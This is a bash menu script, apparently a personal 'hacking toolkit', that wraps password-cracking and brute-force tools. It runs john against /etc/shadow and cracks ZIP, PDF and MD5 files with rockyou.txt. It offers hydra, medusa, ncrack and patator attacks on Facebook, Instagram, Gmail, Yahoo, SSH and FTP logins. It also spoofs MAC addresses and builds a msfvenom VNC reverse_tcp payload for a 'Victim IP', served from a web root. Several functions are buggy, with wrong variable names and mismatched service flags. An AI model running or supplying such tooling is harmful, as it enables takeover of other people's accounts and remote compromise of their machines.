#! /bin/bash

readonly EdScriptpath=$(dirname $(readlink -f "$0"))
readonly EdScriptcfilepath="$EdScriptpath/cfiles"
readonly EdScriptinstallpath="$EdScriptpath/install"
readonly EdScriptlanguagepath="$EdScriptpath/usefulModules"



			function ENCRYPTMESSAGE_BASE64()
			{
			echo -e "\x1b[31m"
			en=$(echo -e "\e[38;5;82mBASE64 \e[38;5;198mENCOD")

			echo "+++++++++++++++++++++++++++++++++++++++++++"
			echo "+                  $en                    +"
			echo "+++++++++++++++++++++++++++++++++++++++++++"

				echo 	"┌─PASTE PALIN TEXT"
				read -p "└─────►" var

		    	echo "$var" |base64
				}




			function DECRYPTMESSAGE_BASE64(){
				echo -e "\x1b[33m"
				en=$(echo -e "\e[38;5;82mBASE64 \e[38;5;198mDECOD")

				echo "+++++++++++++++++++++++++++++++++++++++++++"
				echo "+         $en+"
				echo "+++++++++++++++++++++++++++++++++++++++++++"
	
			   	echo 	"┌─PASTE PLAIN TEXT"
				read -p "└─────►" var
			    	echo "$var" |base64 -d
					} 




			function DECRYPT_LINUX_PASSWORD(){

				en=$(echo -e "\e[38;5;82mCRACK \e[38;5;198mLINUX-PWD \e[0m")
				echo "###########################################"
				echo "+                    $en      +"
				echo "###########################################"
				echo -e "\x1b[37m"

		  		echo "  1-Own Linux Password"
		    	echo 	"┌─2-Select Linux hash In File"
				read -p "└─────►" options
	
   	
					if [ $options -eq 1 ]
				    	then
						john /etc/shadow
						john --show /etc/shadow
			    	elif [ $options -eq 2 ]
				    	then
						a=$(yad --file-selection)
						john $a
						john --show $a


			   	 		fi
					}			





				function DECRYPT_ZIP_FILE(){
					echo -e "\x1b[33m"

					echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
					figlet -f slant "Decrypt ZIP"
					echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
					a=$(yad --file-selection)
					fcrackzip -u -D -p rockyou.txt $a

						}





				function bruteforce(){
                	echo -e "\x1b[36m"
					echo "	1-Facebook"
					echo "	2-Instagram"
					echo "	3-Twitter"
					echo "	4-Google mail"
					echo "	5-yahoo Mail"
					echo "	6-SSH"
					echo "	7-FTP"
					echo "	8-Telnet"
					l=$(echo -e "\e[40;38;5;82m CHOOSE \e[30;48;5;82m OPTIONS \e[0m")

					echo 	"	┌─SELECT ABOVE OPTIONS"
					read -p "	└─────►" option1

					if [ $option1 -eq 1 ]
					then
				 		echo -e "\x1b[33m"
				 		python3 fb.py
				 		read -p " E - EXIT B - BACK" opt
				 		if [ "$opt" == "E" ]
				 		then
				 			bash1
				 		fi

				 		if [ "$opt" == "B" ] 
				 		then
				 			bruteforce
				 		fi

					elif [ $option1 -eq 2 ]
					then
						echo -e "\x1b[33m"
						echo   "┌─[Enter Username]:"
 						read -p "└─────► " b

						echo -e "\x1b[32m"

						echo " 1--> Chill mode --> 4 bots, or 64 passwords at a time"
						echo " 2--> Moderate mode 1 --> 8 bots, or 128 passwords at a time"
						echo " 3--> Moderate mode 1 --> 16 bots, or 256 passwords at a time"
						echo " 4--> Savage mode --> 32 bots, or 512 passwords at a time"
						echo 	"┌─SELECT BELOW OPTIONS"
						read -p "└─────►" select

						if [ $select -eq 1 ]
						then
							python Instagram/instagram.py $b rockyou.txt -m 3
						fi

						if [ $select -eq 2 ]
						then
							python Instagram/instagram.py $b rockyou.txt -m 2
						fi

						if [ $select -eq 3 ]
						then
							python Instagram/instagram.py $b rockyou.txt -m 1
						fi

						if [ $select -eq 4 ]
						then
							python Instagram/instagram.py $b rockyou.txt -m 0
						fi

				elif [ $option1 -eq 3 ]
				then
					echo 	"	┌─SELECT BELOW OPTIONS"
					read -p "	└─────►" select


				elif [ $option1 -eq 4 ]
					then
						figlet -f larry3d "Bruteforce Gmail"

						echo " ┌─ENTER REQUIRED DATA"
						echo " └─────►"
						python gmail_dictionary_attack.py $Email $direct
				

				elif [ $option1 -eq 5 ]
				then
					figlet -f larry3d "Bruteforce yahoo-Mail"
							read -p "Enter Email ID" Email_ID
							read -p " Emter password’s_list rockyou.txt" password’s_list

							hydra -l $Email_ID -P $password’s_list -s 465 -S -t 1 -v -V smtp.mail.yahoo.com smtp


				elif [ $option1 -eq 6 ]
				then
					figlet -f larry3d "Bruteforce SSH"
					echo "1- USING HYDRA "
					echo "2- USING MEDUSA"
					echo "3- USING NCRACK"
					echo "    ┌─ENTER REQUIRED DATA"
					read -p " └─────►" Select
					if [ $Select -eq 1 ]
					then
						figlet -f larry3d "Hydra"

						echo "   ┌─ENTER IP Address"
						read -p " └─────►" ip_address
						hydra -L Brutepwd/xato-net-10-million-usernames-dup.txt -P Brutepwd/xato-net-10-million-passwords-1000000.txt $ip_address ssh
					fi

					if [ $Select -eq 2 ]
					then
					figlet -f larry3d "medusa"
						echo "    ┌─ENTER IP Address"
						read -p " └─────►" ip_address
						medusa -h $ip_address -U Brutepwd/xato-net-10-million-usernames-dup.txt -P Brutepwd/xato-net-10-million-passwords-1000000.txt -M ftp
						fi



					if [ $Select -eq 3 ]
					then
						figlet -f larry3d "Ncrack"
						echo "    ┌─ENTER IP Address"
						read -p " └─────►" ip_address

						ncrack -p 22 -U Brutepwd/xato-net-10-million-usernames-dup.txt -P Brutepwd/xato-net-10-million-passwords-1000000.txt $ip_address
					fi

				elif [ $option1 -eq 7 ]
				then
					figlet -f larry3d "Bruteforce FTP"

				echo 	"1-Hydra"
				echo	"2-Medusa"
				echo	"3-Ncrack"
				echo	"4-Patator"
				echo	"5-Metasploit"
				echo "    ┌─ENTER REQUIRED DATA"
					read -p " └─────►" Select
					if [ $Select -eq 1 ]
					then
						figlet -f larry3d "Hydra"

						read -p "ENTER_IPADDRESS -->" 
						echo "    ┌─ENTER PASSWORD FILE"
						read -p " └─────►" ip_address
						hydra -L Brutepwd/xato-net-10-million-usernames-dup.txt -P Brutepwd/xato-net-10-million-passwords-1000000.txt $ip_address ftp


					fi
					if [ $Select -eq 2 ]
					then
						figlet -f larry3d "medusa"

						echo " ┌─ENTER PASSWORD FILE"
						echo " └─────►" ip_address

						medusa -h $ip_address -U Brutepwd/xato-net-10-million-usernames-dup.txt -P Brutepwd/xato-net-10-million-passwords-1000000.txt -M ftp
							
					fi

					if [ $Select -eq 3 ]
					then

					figlet -f larry3d "Ncrack"

					
						echo " ┌─ENTER PASSWORD FILE"
						echo " └─────►" ip_address

						ncrack –v -U Brutepwd/xato-net-10-million-usernames-dup.txt  -P Brutepwd/xato-net-10-million-passwords-1000000.txt $ip_address:21
					fi

					if [ $Select -eq 4 ]
					then

					figlet -f larry3d "patator"

					
						echo " ┌─ENTER PASSWORD FILE"
						echo " └─────►" ip_address

					patator ftp_login host=ip_address user=FILE0 0=Brutepwd/xato-net-10-million-usernames-dup.txt password=FILE1 1=Brutepwd/xato-net-10-million-passwords-1000000.txt
					fi

				fi

				bash1
				}



			function DECRYPT_PDF(){
				echo -e "\x1b[33m"

					figlet -f slant "Decrypt PDF"

	
					echo "1-FOR NUMERIC PASSWORD"
				    echo "2-FOR SPECIFIC Password You Want To Try With Combination"
					echo "3-Find Password By Wordlist"

					echo 	"┌─SELECT BELOW OPTIONS"
					read -p "└─────►" options
   	
					if [ $options -eq 1 ]
					    	then
						a=$(yad --file-selection)
						pdfcrack -f $a -c 1234567890
					elif [ $options -eq 2 ]
    						then	
						read -p "MiniMum Length of Password" b
						a=$(yad --file-selection)
						pdfcrack -f $a -c $b
					elif [ $options -eq 3 ]
    						then
						a=$(yad --file-selection)
						pdfcrack -f $a -w rockyou.txt
    					fi
	
							}



				function ENCRYPT_ZIP_FILE(){
					echo -e "\x1b[33m"

					echo "+++++++++++++++++++++++++++++++++++++++++++"
					figlet -f shadow "ENCRYPT ZIP"
					echo "+++++++++++++++++++++++++++++++++++++++++++"
					a=$(yad --file-selection)
					zip -e $a
							}

			
					function ENCRYPT_PDF(){
					echo -e "\x1b[33m"
					figlet -f slant "Encrypt PDF"
					read -p "NAME OF FILE AFTER SET PASSWORD --->" output
					read -p "ENTER PASSWORD WANT TO SET IN PDF --->" pass
						a=$(yad --file-selection)
						pdftk $a output $output.pdf owner_pw 12345 user_pw $pass 
						echo "Done"
						echo "See on selected pdf file location"
								}
				function Change_Macaddress(){

						echo "1-Change Macaddress"
						echo "2-change Random mac address"
						echo "3-Show Mac address"
						read -p "Choose Options::" option
 						if [ $option -eq 1 ]
						then
                                                        ifconfig -a
                                                        read -p "network Adopter ::" ad
							ifconfig $ad down
							read -p "give mac ::" mac
							ifconfig $ad hw ether $mac
						        ifconfig $ad up
							ifconfig $ad |grep HWaddr
							$ad Link encap:Ethernet  HWaddr 
						elif [ $option -eq 2 ]
						then
							read -p "network Adopter ::" ad
							ifconfig $ad down
							sudo macchanger -r $ad
						        ifconfig $ad up
							sudo macchanger -s $ad
						elif [ $option -eq 3 ]
							then
                                                        ifconfig -a
							read -p "network Adopter ::" ad
							sudo macchanger -s $ad
						fi				
						}

				function STANOGRAPHY(){

						figlet -f slant "Hide Messgae in Picture"
											echo "				Supported JPEG, BMP, WAV and AU"
						read -p "Enter Password--->" passwd
						echo 	"┌─SELECT Image in which want To embed"
						echo    "└─────►"
						Secret_msg=$(yad --file-selection)
						echo 	"┌─SELECT Embed Message in Txt or other"
						echo    "└─────►"
						Image_given=$(yad --file-selection)
						steghide embed --coverfile $mage_given --embedfile $Secret_msg -p passwd
					}
				function STANOGRAPHY_Crack(){
					figlet -f slant "Findout Messgae in Picture"
											echo "				Supported JPEG, BMP, WAV and AU"

					read -p "Enter Password --->" passw
					echo 	"┌─SELECT File in which want To extract"
					echo    "└─────►"
					File=$(yad --file-selection)

					steghide --extract -sf $File -p $passw
					}
				function DECRYPT_MESSAGE_MD5(){
						echo -e "\e[96m"


						figlet -f slant "Crack MD5 Hash"
						echo "                                  Powerd By HASHCAT"
						echo 	"┌─SELECT Hashfile To decode"
						echo    "└─────►"
						FILE=$(yad --file-selection)
						hashcat --force --potfile-disable -m 0 $FILE rockyou.txt
					}

				  function othermod(){
				  			echo -e "\e[33mO"
							echo "==================================================="
							echo "    1-CHANGE MACADDRES                             !! "
							echo "    2-SPOOF IP address                             !! "
							echo "    3-DELETE ANY File                              !! "
							echo "    4-CHECK SYSTEM INFO                            !! "
							echo "    5-CHEVK ENABLED SERVICE                        !! "
							echo "    6-SEND ANONYMOUS MAIL                          !! "
							echo "    7-IP SPOOF                                     !! "
							echo "==================================================="

							
							
							}
                        function vnc(){
                        	read -p "Enter Victim IP-->" ip 
                        	msfvenom -p windows/vncinject/reverse_tcp lhost=$ip lport=4455 -f exe > /var/www/html/vnc.exe
                        }



function bash1(){


l=$(echo -e "\e[40;38;5;82m Er.SANJAY \e[30;48;5;82m KUMAR \e[0m")
echo -e "\e[32m       ___          _____          ___           ___           ___                       ___                "
echo -e "\e[32m      /  /\        /  /::\        /  /\         /  /\         /  /\        ___          /  /\        ___    "
echo -e "\e[32m     /  /:/_      /  /:/\:\      /  /:/_       /  /:/        /  /::\      /  /\        /  /::\      /  /\   "
echo -e "\e[32m    /  /:/ /\    /  /:/  \:\    /  /:/ /\     /  /:/        /  /:/\:\    /  /:/       /  /:/\:\    /  /:/   "
echo -e "\e[32m   /  /:/ /:/_  /__/:/ \__\:|  /  /:/ /::\   /  /:/  ___   /  /:/~/:/   /__/::\      /  /:/~/:/   /  /:/    "
echo -e "\e[32m  /__/:/ /:/ /\ \  \:\ /  /:/ /__/:/ /:/\:\ /__/:/  /  /\ /__/:/ /:/___ \__\/\:\__  /__/:/ /:/   /  /::\    "
echo -e "\e[32m  \  \:\/:/ /:/  \  \:\  /:/  \  \:\/:/~/:/ \  \:\ /  /:/ \  \:\/:::::/    \  \:\/\ \  \:\/:/   /__/:/\:\   "
echo -e "\e[32m   \  \::/ /:/    \  \:\/:/    \  \::/ /:/   \  \:\  /:/   \  \::/~~~~      \__\::/  \  \::/    \__\/  \:\  "
echo -e "\e[32m    \  \:\/:/      \  \::/      \__\/ /:/     \  \:\/:/     \  \:\          /__/:/    \  \:\         \  \:\ "
echo -e "\e[32m     \  \::/        \__\/         /__/:/       \  \::/       \  \:\         \__\/      \  \:\         \__\/ "
echo -e "\e[32m      \__\/                       \__\/         \__\/         \__\/                     \__\/                     by $l"
echo "."
echo "."
echo "."

echo -e "\x1b[37m"

echo "==========================================================================================================="
echo "=                    ENCRYPT                    !!                        DECRYPT                         ="
echo "==========================================================================================================="
echo "    1-ENCRYPT PDF                               !!              1-DECRYPT PDF                              "
echo "    2-ENCRYPT MESSAGE(BASE64)                   !!              2-DECRYPT MESSAGE(BASE64)                  "
echo "    3-ENCRYPT MESSAGE(MD5)                      !!              3-DECRYPT MESSAGE(MD5)                     "
echo "    4-ENCRYPT ZIP FILE                          !!              4-DECRYPT ZIP FILE                         "
echo "    5-ENCRYPT MESSAGE IN PHOTO(STANOGRAPHY)     !!              5-DECRYPT MESSAGE IN PHOTO(STANOGRAPHY)    "
echo "    6-FINDOUT FILE HIDDEN IN IMAGE OR SONG      !!              6-DECRYPT LINUX PASSWORD(OWN AND OTHERS)   "
echo "                                                !!              7-Crack By Brutefoce MTHD                  "
echo "==========================================================================================================="
d=$(echo -e "\e[31m")
a=$(echo -e "\e[31mE")
b=$(echo -e "\e[32mD")
b1=$(echo -e "\e[32m")
c=$(echo -e "\e[33mO")
c1=$(echo -e "\e[33mO")
read -p "  CHOOSE OPTIONS FOR $d ENCRYPT $a $b1 DECRYPT $b $c1 If U want to Choose some other Modules Type $c :::" opt
if [ "$opt" == "e" ]
then
echo -e "\e[40;38;5;82m ENCRYPT \e[30;48;5;82m MODULES \e[0m"
echo -e "\x1b[31m"
echo "    1-ENCRYPT PDF                               !! "
echo "    2-ENCRYPT MESSAGE(BASE64)                   !! "
echo "    3-ENCRYPT MESSAGE(MD5)                      !! "
echo "    4-ENCRYPT ZIP FILE                          !! "
echo "    5-ENCRYPT MESSAGE IN PHOTO(STANOGRAPHY)     !! "
echo "    6-FINDOUT FILE HIDDEN IN IMAGE OR SONG      !! "
echo "==================================================="
		read -p "CHOOSE OPTIONS ::" option
		if [ $option -eq 1 ]
			then 
			ENCRYPT_PDF
			bash1

		elif [ $option -eq 2 ]
			then
			ENCRYPTMESSAGE_BASE64
			bash1
		elif [ $option -eq 3 ]
			then
				echo 	"┌─SELECT BELOW OPTIONS"
				read -p "└─────►" msg
			echo $msg |md5sum
			bash1

		elif [ $option -eq 4 ]
			then
			ENCRYPT_ZIP_FILE
			bash1
		elif [ $option -eq 5 ]
			then
			STANOGRAPHY
			bash1
		elif [ $option -eq 6 ]
			then
			echo 	"┌─SELECT File in which want To Check"
			echo    "└─────►"
			a=$(yad --file-selection)
			binwalk $a
			bash1
		fi

elif [ "$opt" == "d" ]
then
echo -e "\e[40;38;5;82m DECRYPT \e[30;48;5;82m MODULES \e[0m"
echo -e "\e[32mD"
echo "    1-DECRYPT PDF                               !! "
echo "    2-DECRYPT MESSAGE(BASE64)                   !! "
echo "    3-DECRYPT MESSAGE(MD5)                      !! "
echo "    4-DECRYPT ZIP FILE                          !! "
echo "    5-DECRYPT MESSAGE IN PHOTO(STANOGRAPHY)     !! "
echo "    6-DECRYPT LINUX PASSWORD(OWN AND OTHERS)    !! "
echo "    7-Crack By Brutefoce MTHD                   !! "
echo "==================================================="

		read -p "CHOOSE OPTIONS ::" option
		if [ $option -eq 1 ]
			then 
			DECRYPT_PDF
			bash1
		elif [ $option -eq 2 ]
			then
			DECRYPTMESSAGE_BASE64
			bash1
		elif [ $option -eq 3 ]
			then
			DECRYPT_MESSAGE_MD5
			bash1

		elif [ $option -eq 4 ]
			then
			DECRYPT_ZIP_FILE
			bash1
		elif [ $option -eq 5 ]
			then

			STANOGRAPHY_Crack
			bash1
		elif [ $option -eq 6 ]
			then
			DECRYPT_LINUX_PASSWORD
			bash1
		elif [ $option -eq 7 ]
			then
			bruteforce
			read -p "YOU WANT TO TRY SOMETHING ELSE YES=y NO=n" ch
			if [ "$ch" == "y" ]
				then
				bruteforce
			elif [ "$ch" == "n" ]
				then
				bash1
			fi
		fi
elif [ "$opt" == "o" ]
then	
echo -e "\e[40;38;5;82m SOME OTHER \e[30;48;5;82m MODULES \e[0m"
othermod
read -p "CHOOSE OPTIONS ::" option
		if [ $option -eq 1 ]
			then 
			Change_Macaddress
			bash1
		elif [ $option -eq 2 ]
			then
			DECRYPTMESSAGE_BASE64
			bash1
		elif [ $option -eq 3 ]
			then
			read -p "MESSAGE::" msg
			echo $msg |md5sum
			bash1

		elif [ $option -eq 4 ]
			then
			DECRYPT_ZIP_FILE
			bash1
		elif [ $option -eq 5 ]
			then

			ENCRYPT_ZIP_FILE
			bash1
		elif [ $option -eq 6 ]
			then
			DECRYPT_LINUX_PASSWORD
			bash1
		fi


else
	echo "wrong TRY AGAIN"
    bash1
fi

}


bash1
